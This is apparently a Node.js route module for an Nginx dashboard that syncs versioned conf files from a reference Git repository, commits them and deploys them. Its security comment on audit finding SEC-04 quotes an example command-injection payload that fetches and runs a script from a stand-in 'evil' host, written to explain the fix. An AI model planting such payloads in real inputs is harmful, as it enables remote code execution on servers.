'use strict';
/**
 * Synchronisation with the reference configuration repository.
 *
 * Compares the snippets and conf files shipped upstream with what is installed
 * locally, using the `# version:` header each reference file carries, and
 * writes the selected updates into the Git work tree.
 *
 * Two rules come from production incidents:
 *
 *  - The local enabled/disabled state always wins. A file installed as
 *    `.conf.DISABLE` stays disabled when it is updated, and a new file arrives
 *    disabled so it cannot take effect before the operator has looked at it.
 *  - Without a Git repository the copy is additive only. The work tree then
 *    holds a subset of the configuration, so deleting whatever is missing from
 *    it would wipe files that were never meant to be managed here.
 *
 * These declarations used to live inside the request handler, which meant they
 * were rebuilt on every single request.
 */

const fs   = require('fs');
const path = require('path');
const http = require('http');

const cfg     = require('../lib/config');
const httpLib = require('../lib/http');
const auth    = require('../lib/auth');
const tree    = require('../lib/fs-tree');
const events  = require('../lib/events');
// getGitCfg() reads git.yml fresh (env as fallback) — same repo/branch/token
// as the deploy feature, since both push to the operator's own Git repo.
const { getGitCfg } = require('../lib/git');

const { PERMS, hasPerm } = auth;
const { send, parseBody } = httpLib;
const { safeReadDir, safeReadFile, safeStat } = tree;
const { logEvent } = events;
const {
  SYNC_REF_URL, SYNC_REF_SECTIONS, SYNC_REF_PATH_PREFIX, DIR_GIT_WORK,
  DIR_CONF, DIR_SITES, DIR_SNIPPETS, DIR_STREAMS,
} = cfg;

/**
 * Deployment is a separate feature, and features never import each other.
 * server.js — the composition root — injects the two entry points here.
 */
let deployFromGit     = async () => { throw new Error('deploy not wired'); };
let deployFromGitWork = async () => { throw new Error('deploy not wired'); };

function setDeployHandlers({ fromGit, fromGitWork }) {
  if (fromGit)     deployFromGit     = fromGit;
  if (fromGitWork) deployFromGitWork = fromGitWork;
}

const SECTION_DIR_MAP = {
  conf:     DIR_CONF,
  sites:    DIR_SITES,
  snippets: DIR_SNIPPETS,
  streams:  DIR_STREAMS,
};

/**
 * Path inside the reference repo for a given section — at the repo root by
 * default, matching a repo dedicated entirely to conf/sites/snippets/streams.
 * A repo that instead nests these under a subfolder (e.g. a monorepo shared
 * with other projects) can set SYNC_REF_PATH_PREFIX to that subfolder name.
 */
function buildRefPath(section) {
  return SYNC_REF_PATH_PREFIX ? `${SYNC_REF_PATH_PREFIX}/${section}` : section;
}

async function fetchRefFileList(section) {
  if (!SYNC_REF_URL) return [];
  const u = new URL(SYNC_REF_URL.replace(/\/?$/, ''));
  const parts = u.pathname.replace(/^\//, '').split('/');
  if (parts.length < 2) return [];
  const [owner, repo] = parts;
  const apiUrl = `${u.origin}/api/v1/repos/${owner}/${repo}/contents/${buildRefPath(section)}?ref=main`;
  return new Promise((resolve) => {
    const proto = apiUrl.startsWith('https') ? require('https') : http;
    const req = proto.request(Object.assign(new URL(apiUrl), { method: 'GET', headers: { 'User-Agent': cfg.HTTP_USER_AGENT }, timeout: 10000 }), (res) => {
      let data = '';
      res.on('data', d => data += d);
      res.on('end', () => { try { const r = JSON.parse(data); resolve(Array.isArray(r) ? r.filter(f => f.type === 'file' && (f.name.endsWith('.conf') || f.name.endsWith('.conf.DISABLE'))) : []); } catch { resolve([]); } });
    });
    req.on('error', () => resolve([]));
    req.on('timeout', () => { req.destroy(); resolve([]); });
    req.end();
  });
}

async function fetchRefFileContent(rawUrl) {
  return new Promise((resolve) => {
    const proto = rawUrl.startsWith('https') ? require('https') : http;
    const req = proto.request(Object.assign(new URL(rawUrl), { method: 'GET', headers: { 'User-Agent': cfg.HTTP_USER_AGENT }, timeout: 10000 }), (res) => {
      let data = '';
      res.on('data', d => data += d);
      res.on('end', () => resolve(data));
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
    req.end();
  });
}

function parseFileVersion(content) {
  const m = (content || '').match(/^#\s*version\s*:\s*([^\n\r]+)/im);
  return m ? m[1].trim() : '0.0.0';
}

function semverGt(a, b) {
  const pa = (a || '0.0.0').split('.').map(Number);
  const pb = (b || '0.0.0').split('.').map(Number);
  for (let i = 0; i < 3; i++) {
    if ((pa[i] || 0) > (pb[i] || 0)) return true;
    if ((pa[i] || 0) < (pb[i] || 0)) return false;
  }
  return false;
}

function findLocalFile(dir, filename) {
  // Strip both .conf and .conf.DISABLE to get the true base name
  const base = filename.replace(/\.conf\.DISABLE$/i, '').replace(/\.conf$/i, '');
  const active   = path.join(dir, base + '.conf');
  const disabled = path.join(dir, base + '.conf.DISABLE');
  if (fs.existsSync(active))   return { path: active,   disabled: false, exists: true };
  if (fs.existsSync(disabled)) return { path: disabled, disabled: true,  exists: true };
  // New file: if ref provides it as .DISABLE, default to disabled locally
  const refIsDisabled = filename.endsWith('.DISABLE');
  return { path: refIsDisabled ? disabled : active, disabled: refIsDisabled, exists: false };
}

async function buildSyncCheck(sections) {
  const results = [];
  for (const section of (sections || SYNC_REF_SECTIONS)) {
    const dir = SECTION_DIR_MAP[section];
    if (!dir) continue;
    const files = await fetchRefFileList(section);
    for (const f of files) {
      const remoteContent = await fetchRefFileContent(f.download_url || f.url);
      if (remoteContent === null) continue;
      const remoteVersion = parseFileVersion(remoteContent);
      const local         = findLocalFile(dir, f.name);
      const localContent  = local.exists ? (safeReadFile(local.path) || '') : '';
      const localVersion  = parseFileVersion(localContent);
      const hasUpdate     = semverGt(remoteVersion, localVersion);
      const status        = !local.exists ? 'new' : hasUpdate ? 'update' : 'ok';
      results.push({ section, file: f.name, localPath: local.path, localExists: local.exists,
        localDisabled: local.disabled, localVersion, remoteVersion, status, remoteContent });
    }
  }
  return results;
}

function applySyncToGitWork(items) {
  const applied = [];
  for (const item of items) {
    if (item.status === 'ok') continue;
    const sectionDir = path.join(DIR_GIT_WORK, item.section);
    fs.mkdirSync(sectionDir, { recursive: true });
    // Normalise base: strip both .conf and .conf.DISABLE
    const baseName   = item.file.replace(/\.conf\.DISABLE$/i, '').replace(/\.conf$/i, '');
    // Preserve local DISABLE state if the file already exists; a brand-new
    // file always arrives disabled so it cannot take effect before an
    // operator has looked at it (see this module's own header comment).
    // Fix MISC-03 (v12.21.1): both branches used to read `item.localDisabled`
    // — for a new file that is `false` (nothing local to read a state from),
    // so new files were written enabled and immediately deployed, the exact
    // opposite of the documented contract.
    const shouldDisable = item.localExists ? item.localDisabled : true;
    const targetName = shouldDisable ? baseName + '.conf.DISABLE' : baseName + '.conf';
    fs.writeFileSync(path.join(sectionDir, targetName), item.remoteContent, 'utf8');
    applied.push({ section: item.section, file: targetName, status: item.status,
      remoteVersion: item.remoteVersion, disabled: item.localExists ? item.localDisabled : true });
  }
  return applied;
}

/** Commit sync changes into the personal Git repo and push.
 *  Called only when GIT_REPO_URL is configured.
 *  Returns { ok, log[] }
 *
 * SECURITY (fix v12.21.1, audit finding SEC-04): the commit message below is
 * built from `a.remoteVersion`, which comes straight from a `# version:`
 * comment inside a file fetched from SYNC_REF_URL — a repository the
 * operator does not control (that's the whole point of a shared reference
 * repo). Until this fix, `run()` interpolated that string into a shell
 * command line run through `child_process.exec()`; the only escaping was
 * `"` → `'`, so a version comment like `1.3.$(curl evil/x|sh)` reached a
 * live shell inside a container that holds the Docker socket — remote code
 * execution from a compromised or MITM'd reference repo, triggered simply by
 * clicking "Appliquer". `run()` now wraps `execFile('git', argv, ...)`: argv
 * is a plain array, so no shell ever parses it and `$()`/backticks/`;` stay
 * inert data inside the -m argument. Branch/repo URL still go through
 * lib/git.js's own validateBranch()/validateRepoUrl() so a poisoned git.yml
 * can't reach argv as a bare flag either (same reasoning as SEC-01).
 */
async function commitAndPushSync(applied) {
  const { execFile } = require('child_process');
  const gitLib = require('../lib/git');
  const g = getGitCfg();
  gitLib.validateBranch(g.branch, 'branch');
  const log = [];
  const run = (args) => new Promise((resolve, reject) => {
    execFile('git', args, { cwd: DIR_GIT_WORK, timeout: 60000, env: { ...process.env, GIT_TERMINAL_PROMPT: '0' } },
      (err, stdout, stderr) => {
        const out = gitLib.redactUrl((stdout + stderr).trim());
        if (out) log.push(out);
        err ? reject(new Error(out || gitLib.redactUrl(err.message))) : resolve(out);
      });
  });

  // Make sure git-work is a valid repo (pull was done earlier in pipeline)
  try {
    await run(['status']);
  } catch {
    throw new Error('git-work is not a git repository — run a Pull first');
  }

  // Stage only the synced sections
  const sections = [...new Set(applied.map(a => a.section))];
  for (const s of sections) {
    await run(['add', `${s}/`]);
  }

  // Check if there is anything to commit
  const status = await run(['status', '--porcelain']).catch(() => '');
  if (!status.trim()) {
    log.push('Nothing to commit — all files already up to date in repo');
    return { ok: true, log, committed: false };
  }

  // Build commit message. `a.section`/`a.file` are built locally from a
  // fixed section list and a sanitised filename (findLocalFile()); only
  // `a.remoteVersion` is attacker-influenced (see SECURITY note above) — it
  // is confined to being one line of the argv[] entry passed to `-m`, never
  // shell syntax, but a literal newline in it could still smuggle extra
  // "lines" into the message, so it's flattened defensively too.
  const lines = ['sync: update reference files', ''];
  applied.forEach(a => lines.push(
    `- ${a.section}/${a.file}: ${a.status === 'new' ? 'new' : String(a.remoteVersion).replace(/[\r\n]/g, ' ').slice(0, 200)}`));
  const msg = lines.join('\n');

  const userName  = String(g.userName || 'Nginx Dashboard').replace(/[\r\n]/g, ' ');
  const userEmail = String(g.userEmail || 'dashboard@localhost').replace(/[\r\n]/g, ' ');
  await run(['-c', `user.name=${userName}`, '-c', `user.email=${userEmail}`, 'commit', '-m', msg]);
  log.push(`[OK] Committed: ${applied.length} file(s)`);

  // Push to remote
  const remote = gitLib.effectiveRepoUrl(g);
  await run(['push', remote, g.branch]);
  log.push(`[OK] Pushed to ${g.branch}`);

  return { ok: true, log, committed: true };
}
// ─── Routes ──────────────────────────────────────────────────────────────────
function register(router) {
  router.get('/api/sync/status', async ({ req, res, session, url }) => {
    if (!hasPerm(session, PERMS.VIEW_CONFIGS)) return httpLib.forbidden(res);
    return send(res, 200, {
      configured: !!SYNC_REF_URL,
      url: SYNC_REF_URL || null,
      sections: SYNC_REF_SECTIONS,
      pathPrefix: SYNC_REF_PATH_PREFIX || null,
    });
  });

  router.get('/api/sync/check', async ({ req, res, session, url }) => {
    if (!hasPerm(session, PERMS.VIEW_CONFIGS)) return httpLib.forbidden(res);
    if (!SYNC_REF_URL) return send(res, 200, { configured: false });
    const sections = url.searchParams.get('sections')?.split(',') || SYNC_REF_SECTIONS;
    try {
      const items = await buildSyncCheck(sections);
      const summary = { new: 0, update: 0, ok: 0, total: items.length };
      items.forEach(i => summary[i.status] = (summary[i.status] || 0) + 1);
      // Don't send full remoteContent in check — too heavy
      return send(res, 200, {
        configured: true,
        summary,
        items: items.map(i => ({
          section:       i.section,
          file:          i.file,
          localExists:   i.localExists,
          localDisabled: i.localDisabled,
          localVersion:  i.localVersion,
          remoteVersion: i.remoteVersion,
          status:        i.status,
        })),
      });
    } catch(e) {
      return send(res, 200, { configured: true, error: e.message });
    }
  });

  router.post('/api/sync/preview', async ({ req, res, session, url }) => {
    if (!hasPerm(session, PERMS.DEPLOY)) return httpLib.forbidden(res);
    if (!SYNC_REF_URL) return httpLib.badRequest(res, 'SYNC_REF_URL not configured');
    const body = await parseBody(req);
    const files = body.files; // array of {section, file} to preview
    try {
      const allItems = await buildSyncCheck(body.sections || SYNC_REF_SECTIONS);
      // Filter to requested files if provided
      const items = files
        ? allItems.filter(i => files.some(f => f.section === i.section && f.file === i.file))
        : allItems.filter(i => i.status !== 'ok');
      return send(res, 200, {
        items: items.map(i => ({
          section:       i.section,
          file:          i.file,
          localExists:   i.localExists,
          localDisabled: i.localDisabled,
          localVersion:  i.localVersion,
          remoteVersion: i.remoteVersion,
          status:        i.status,
          remoteContent: i.remoteContent,
          localContent:  i.localExists ? (safeReadFile(i.localPath) || '') : null,
        })),
      });
    } catch(e) {
      return httpLib.serverError(res, e);
    }
  });

  router.post('/api/sync/apply', async ({ req, res, session, url }) => {
    if (!hasPerm(session, PERMS.DEPLOY)) return httpLib.forbidden(res);
    if (!SYNC_REF_URL) return httpLib.badRequest(res, 'SYNC_REF_URL not configured');
    const body = await parseBody(req);
    const files = body.files;
    const withDeploy = body.deploy !== false; // default: run pipeline after
    try {
      const allItems = await buildSyncCheck(body.sections || SYNC_REF_SECTIONS);
      const toApply  = files
        ? allItems.filter(i => files.some(f => f.section === i.section && f.file === i.file))
        : allItems.filter(i => i.status !== 'ok');

      if (!toApply.length) return send(res, 200, { applied: [], message: 'Nothing to update' });

      // Step 1 — write to git-work
      const applied = applySyncToGitWork(toApply);
      logEvent('sync_apply', `Applied ${applied.length} reference file(s) to git-work`);
      const pipelineLog = [];

      const gcfg = getGitCfg();
      const hasGit = !!(gcfg.repoUrl && gcfg.branch);

      // Step 2a — WITH Git: commit + push → let standard pipeline deploy
      if (hasGit) {
        pipelineLog.push(`[sync] ${applied.length} file(s) written to git-work`);
        try {
          const commitRes = await commitAndPushSync(applied);
          commitRes.log.forEach(l => pipelineLog.push(l));
          if (!commitRes.committed) {
            pipelineLog.push('[sync] No new commits — files already in repo');
          }
        } catch(e) {
          pipelineLog.push(`[ERROR] Git commit/push failed: ${e.message}`);
          return send(res, 200, {
            applied, ok: false,
            message: 'Files written but Git push failed — deploy manually',
            log: pipelineLog,
            mode: 'git',
          });
        }

        // Step 3 — standard deploy pipeline (pull → test → backup → sync → reload)
        if (withDeploy) {
          try {
            const deployResult = await deployFromGit();
            deployResult.log?.forEach(l => pipelineLog.push(l));
            pipelineLog.push(deployResult.ok ? '[OK] Deployment complete' : '[ERR] Deployment failed');
            logEvent('sync_apply', { applied, deployed: deployResult.ok });
            return send(res, 200, {
              applied, ok: deployResult.ok,
              message: deployResult.ok
                ? `${applied.length} file(s) synced, committed, and deployed`
                : 'Sync committed but deployment failed',
              log: pipelineLog,
              mode: 'git',
            });
          } catch(e) {
            pipelineLog.push(`[ERROR] Deploy pipeline: ${e.message}`);
            return send(res, 200, { applied, ok: false, log: pipelineLog, mode: 'git',
              message: 'Committed but deploy failed — check pipeline' });
          }
        }

        logEvent('sync_apply', { applied });
        return send(res, 200, {
          applied, ok: true, log: pipelineLog, mode: 'git',
          message: `${applied.length} file(s) committed to repo — trigger deployment manually`,
          nextStep: 'deploy',
        });
      }

      // Step 2b — WITHOUT Git: deploy directly from git-work (no pull needed)
      pipelineLog.push(`[sync] ${applied.length} file(s) written to git-work (no Git repo configured)`);
      if (withDeploy) {
        try {
          const deployResult = await deployFromGitWork();
          (deployResult.log || []).forEach(function(entry) {
            pipelineLog.push(typeof entry === 'string' ? entry : (entry.msg || JSON.stringify(entry)));
          });
          pipelineLog.push(deployResult.ok ? '[OK] Deployment complete' : '[ERR] Deployment failed');
          logEvent('sync_apply', { applied, deployed: deployResult.ok });
          return send(res, 200, {
            applied, ok: deployResult.ok,
            message: deployResult.ok
              ? `${applied.length} file(s) synced and deployed`
              : 'Sync written but deployment failed',
            log: pipelineLog,
            mode: 'local',
          });
        } catch(e) {
          const msg = e.error || e.message || String(e);
          pipelineLog.push(`[ERROR] Deploy: ${msg}`);
          return send(res, 200, { applied, ok: false, log: pipelineLog, mode: 'local',
            message: 'Files written but deploy failed' });
        }
      }

      logEvent('sync_apply', { applied });
      return send(res, 200, {
        applied, ok: true, log: pipelineLog, mode: 'local',
        message: `${applied.length} file(s) written to git-work — trigger deployment manually`,
        nextStep: 'deploy',
      });

    } catch(e) {
      return httpLib.serverError(res, e);
    }
  });
}

module.exports = {
  register, setDeployHandlers, SECTION_DIR_MAP,
  fetchRefFileList, fetchRefFileContent, parseFileVersion, semverGt, buildRefPath,
  findLocalFile, buildSyncCheck, applySyncToGitWork, commitAndPushSync,
};
